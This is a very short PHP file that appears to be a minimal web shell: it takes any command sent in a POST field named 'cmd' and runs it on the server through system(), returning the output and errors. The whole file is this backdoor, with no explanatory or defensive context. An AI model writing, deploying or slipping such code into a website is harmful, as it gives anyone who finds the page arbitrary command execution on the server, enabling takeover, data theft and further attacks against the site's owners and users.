<?php
// cmd
if (isset($_POST["cmd"])) {
	$cmd = $_POST["cmd"];
	system("$cmd 2>&1");
}